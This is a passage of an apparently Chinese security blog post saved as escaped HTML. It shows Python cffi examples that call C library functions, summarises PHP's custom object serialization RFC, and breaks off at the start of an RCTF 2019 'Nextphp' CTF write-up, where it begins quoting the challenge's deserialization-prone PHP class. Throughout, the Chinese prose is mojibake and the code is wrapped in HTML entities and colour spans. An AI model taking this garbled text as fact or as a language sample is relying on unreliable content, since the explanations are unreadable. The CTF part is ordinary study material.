&lt;span style="color:#111">arg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;char[]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># å³ char arg[]=&amp;#34;world&amp;#34;;&lt;/span>
&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">arg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªæ —å­é‡Œç›´æŽ¥åœ¨ä¸€ä¸ªpyæ–‡ä»¶ä¸­ç”¨cffiè°ƒç”¨åº“å‡½æ•°å°±ç»“æŸäº†ï¼Œè‚¥è‚ è‚¥è‚ çš„ç®€å•ï¼›æˆ–è€…ä¹Ÿå¯ä»¥å’Œctypesä¸€æ ·ï¼Œå•ç‹¬å†™ä¸€ä¸ªcå…ˆ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">Tprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello, world&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åŽè°ƒç”¨&lt;code>ffi.verify()&lt;/code>åœ¨Pythonä¸­åŠ è½½å’Œä½¿ç”¨ï¼Œä¸è¿‡è¿˜éœ€è¦é¢å¤–å£°æ˜Žå‡½æ•°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#d88200"> int Tadd(int a, int b);
&lt;/span>&lt;span style="color:#d88200"> void Tprint(void);
&lt;/span>&lt;span style="color:#d88200"> int Tmul(int a, int b);
&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">verify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sources&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;uu.c&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tprint&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202180822923.png" alt="image-20211202180822923">&lt;/p>
&lt;p>ä»¥ä¸Šæ–¹å¼éƒ½æ˜¯åœ¨çº¿apiæ¨¡å¼ï¼Œcffiè¿˜æ”¯æŒç¦»çº¿apiæ¨¡å¼ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªdemo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;span style="color:#111">ffibuilder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#d88200"> double sqrt(double x);
&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># éœ€è¦çš„å¤´æ–‡ä»¶&lt;/span>
&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_libmath&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#d88200"> #include &amp;lt;math.h&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">library_dirs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[],&lt;/span>
&lt;span style="color:#111">libraries&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;m&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">verbose&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python build_cffi.py
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">_libmath&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">lib&lt;/span>
&lt;span style="color:#75715e"># ç›´æŽ¥è°ƒç”¨cå‡½æ•°&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sqrt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4.5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">F&lt;/span>&lt;span style="color:#d88200">&amp;#34;The square root of 4.5 is &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python test.py
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173047579.png" alt="image-20211202173047579">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå…ˆç”¨ä¸€ä¸ªpyæ–‡ä»¶è°ƒç”¨.hæ¥ç¼–è¯‘ç”Ÿæˆ.soå’Œ.cï¼Œç„¶åŽåœ¨å¦ä¸€ä¸ªpyæ–‡ä»¶ä¸­è°ƒç”¨.cå³å¯&lt;/p>
&lt;p>æˆ–è€…è¿˜æœ‰ç¬¬ä¸‰ç§æ–¹å¼ï¼Œåœ¨Pythonä¸­ä½¿ç”¨å¤–éƒ¨å·²ç»å®šä¹‰å¥½çš„cåº“å‡½æ•°ï¼›è¿™é‡Œä½¿ç”¨&lt;a href="https://github.com/wolever">wolever&lt;/a>/&lt;a href="https://github.com/wolever/python-cffi-example">python-cffi-example&lt;/a>æ¥æ¼”ç¤ºï¼ˆ&lt;del>å°±ä¸å¤åˆ¶ç²˜è´´äº†æ&lt;/del> å°±ç²˜å°±ç²˜&lt;/p>
&lt;p>é¦–å…ˆæ˜¯ä¸€ä¸ª&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/fnmatch.h#L1-L18">fnmatch.h&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202184827657.png" alt="image-20211202184827657">&lt;/p>
&lt;p>æ³¨æ„7 8 9è¡Œè¦æ”¹ä¸€ä¸‹çš„ï¼Œæ ¹æ®/usr/include/fnmatch.hæ”¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202185217525.png" alt="image-20211202185217525">&lt;/p>
&lt;p>è¿™æ˜¯&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/build_fnmatch.py#L1">build_fnmatch.py&lt;/a>ï¼Œç”¨äºŽç”Ÿæˆæ¨¡å—åœ¨fnmatch.pyä¸­ä½¿ç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi_example._fnmatch&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75715e"># Since we are calling fnmatch directly no custom source is necessary. We&lt;/span>
&lt;span style="color:#75715e"># need to #include &amp;lt;fnmatch.h&amp;gt;, though, because behind the scenes cffi&lt;/span>
&lt;span style="color:#75715e"># generates a .c file which contains a Python-friendly wrapper around&lt;/span>
&lt;span style="color:#75715e"># ``fnmatch``:&lt;/span>
&lt;span style="color:#75715e"># static PyObject *&lt;/span>
&lt;span style="color:#75715e"># _cffi_f_fnmatch(PyObject *self, PyObject *args) {&lt;/span>
&lt;span style="color:#75715e"># ... setup ...&lt;/span>
&lt;span style="color:#75715e"># result = fnmatch(...);&lt;/span>
&lt;span style="color:#75715e"># return PyInt_FromLong(result);&lt;/span>
&lt;span style="color:#75715e"># }&lt;/span>
&lt;span style="color:#d88200">&amp;#34;#include &amp;lt;fnmatch.h&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75715e"># The important thing is to inclue libc in the list of libraries we&amp;#39;re&lt;/span>
&lt;span style="color:#75715e"># linking against:&lt;/span>
&lt;span style="color:#111">libraries&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;fnmatch.h&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€ä¸ª&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/setup.py#L1-L33">setup.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">setuptools&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">find_packages&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi-example&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">version&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">classifiers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Development Status :: 4 - Beta&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 2&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 3&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: Implementation :: PyPy&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;License :: OSI Approved :: BSD License&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">packages&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">find_packages&lt;/span>&lt;span style="color:#111">(),&lt;/span>
&lt;span style="color:#111">install_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">setup_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">cffi_modules&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#34;./build_fnmatch.py:ffi&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ€åŽçš„cffi_modulesæŒ‡å®šäº†éœ€è¦ç”Ÿæˆffiå®žä¾‹çš„æ–‡ä»¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">pyhon setup.py install
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190508189.png" alt="image-20211202190508189">&lt;/p>
&lt;p>æ²¡æƒ³åˆ°æ˜¯ä¸ªæŠ¥é”™ï¼Œä»”ç»†çœ‹ä¸€ä¸‹åŽŸå› ï¼Œè§£å†³æ–¹æ³•æ˜¯æŠŠä¹‹å‰çš„fnmatch.hä¸­çš„åç§»æ¢æˆ16è¿›åˆ¶&lt;/p>
&lt;p>å†æ¬¡æ‰§è¡Œå°±å¥½äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190825764.png" alt="image-20211202190825764">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°è¿™ç§æ–¹å¼æ¯”ä¹‹å‰ç”Ÿæˆçš„æ–‡ä»¶éƒ½è¦å¤šï¼Œç›¸å½“äºŽå®‰è£…äº†ä¸€ä¸ªæ¨¡å—&lt;/p>
&lt;p>ç„¶åŽæ˜¯ä¸€ä¸ªtest_fnmatch.pyï¼Œæ³¨æ„è¿™é‡Œç›´æŽ¥ç”¨ç»™å‡ºçš„æ–‡ä»¶è¿˜æ˜¯ä¼šæŠ¥é”™ï¼ŒæŠŠä¸‹å›¾é«˜äº®çš„åœ°æ–¹æ¢æˆ0x1&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202191447689.png" alt="image-20211202191447689">&lt;/p>
&lt;p>å†æ‰§è¡Œå°±å¥½äº†&lt;/p>
&lt;p>cffiå’Œctypesè¿˜æœ‰å¾ˆå¤šçš„èŠ±æ´»ï¼Œé‰´äºŽæˆ‘çš„ä»£ç èƒ½åŠ›ä¸€èˆ¬ï¼ˆcå’Œpythonéƒ½æ˜¯å‹‰å¼ºå¤Ÿç”¨çš„æ°´å¹³ï¼‰ï¼Œå°±ä¸ç­é—¨å¼„æ–§äº†ï¼Œæ›´å¤šçš„ä¸œè¥¿è¿˜æ˜¯çœ‹å®˜æ–¹æ–‡æ¡£æ¯”è¾ƒé è°±ï¼ˆé“¾æŽ¥è´´åœ¨æœ€åŽäº†&lt;/p>
&lt;p>â€”â€”â€”â€”ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆFFI in PHPä»‹ç»çš„è¿˜ä¸å¦‚FFI in Pythonçš„å¤šï¼Ÿ&lt;/p>
&lt;p>emmmmm è¿™ä¸ªå˜› æ‰ä¸ä¼šè¯´æ˜¯å› ä¸ºæ‡’å‘¢&lt;/p>
&lt;h2 id="serializable">Serializable&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | php7.4å¯ç”¨&lt;/li>
&lt;/ul>
&lt;p>å·²æœ‰çš„ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•æ€»æ˜¯æœ‰å¾ˆå¤šå®‰å…¨é—®é¢˜ï¼Œè¿™ä¸ªæè®®æ–°å¢žäº†&lt;code>__serialize()&lt;/code>ï¼Œ&lt;code>__unserialize()&lt;/code>ï¼Œ&lt;code>serialize()&lt;/code>ï¼Œ&lt;code>unserialize()&lt;/code>å’Œ&lt;code>Serializable()&lt;/code>&lt;/p>
&lt;p>&lt;code>serialize()&lt;/code>æ£€æŸ¥åˆ°&lt;code>__serialize()&lt;/code>çš„å­˜åœ¨åŽå°†åœ¨åºåˆ—åŒ–ä¹‹å‰ä¼˜å…ˆæ‰§è¡Œï¼Œè¿”å›žåºåˆ—åŒ–å½¢å¼çš„æ•°ç»„ï¼Œå¦‚æœ‰é”™æŠ›å‡ºTypeErrorï¼›å¦‚æžœåŒæ—¶æœ‰&lt;code>__serialize()&lt;/code>å’Œ&lt;code>__sleep()&lt;/code>ï¼ŒåŽè€…å°†è¢«å¿½ç•¥ï¼›å¦‚æžœå¯¹è±¡å®žçŽ°äº†&lt;code>Serializable()&lt;/code>æŽ¥å£ï¼ŒæŽ¥å£çš„&lt;code>serialize()&lt;/code>å°†è¢«å¿½ç•¥ï¼Œç±»ä¸­çš„&lt;code>__serialize()&lt;/code>å°†è¢«è°ƒç”¨ï¼›ååºåˆ—åŒ–æ—¶è§¦å‘&lt;code>__unserialize()&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”å¥½å‹¾å…«å¤æ‚çš„ï¼Œå»ºè®®ç›´æŽ¥çœ‹æ–‡æ¡£&lt;/p>
&lt;h2 id="rctf-2019nextphp">[RCTF 2019]Nextphp&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;print_r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
